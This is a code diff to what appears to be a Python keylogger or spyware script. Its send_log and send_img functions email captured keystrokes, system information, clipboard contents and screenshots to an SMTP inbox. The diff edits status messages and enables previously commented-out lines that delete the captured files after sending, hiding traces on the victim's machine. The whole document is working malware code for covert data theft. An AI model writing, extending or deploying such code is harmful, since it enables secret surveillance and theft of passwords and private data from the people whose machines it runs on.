@@ -92,7 +92,7 @@ def send_log():
         file3_data=f3.read() 
         file3_name=f3.name
     #print(access_details)
-    print("sending")
+    print("sending info")
     with SMTP(
         host=access_details.smtp_server_host,
         port= access_details.smtp_server_port,
@@ -106,11 +106,11 @@ def send_log():
         smtp.send_message(msg=msg,to_addrs=inbox.email_address,from_addr=inbox.email_address)
         smtp.quit()
     print("check your mail :)")
-    # c=c+1
-    # os.remove(file_path+ extend + keys_information)
-    # if c<1:
-    #     os.remove(file_path+ extend +system_information)
-    # os.remove(file_path+ extend + clipboard_information) #deletes files
+    c=c+1
+    os.remove(file_path+ extend + keys_information)
+    if c<1:
+        os.remove(file_path+ extend +system_information)
+    os.remove(file_path+ extend + clipboard_information) #deletes files
     tlog.reset()
     tlog.start()
    
@@ -123,7 +123,7 @@ def send_img():
         file_name=f4.name
     
     print(access_details)
-    print("sending")
+    print("sending image")
     with SMTP(
         host=access_details.smtp_server_host,
         port= access_details.smtp_server_port,
@@ -134,7 +134,7 @@ def send_img():
         smtp.send_message(msg=msg,to_addrs=inbox.email_address,from_addr=inbox.email_address)
         smtp.quit()
     print("check your mail :)")
-    # os.remove(file_path+ extend + screenshot_information) #deletes png file
+    os.remove(file_path+ extend + screenshot_information) #deletes png file
     timg.reset()
     timg.start()
     
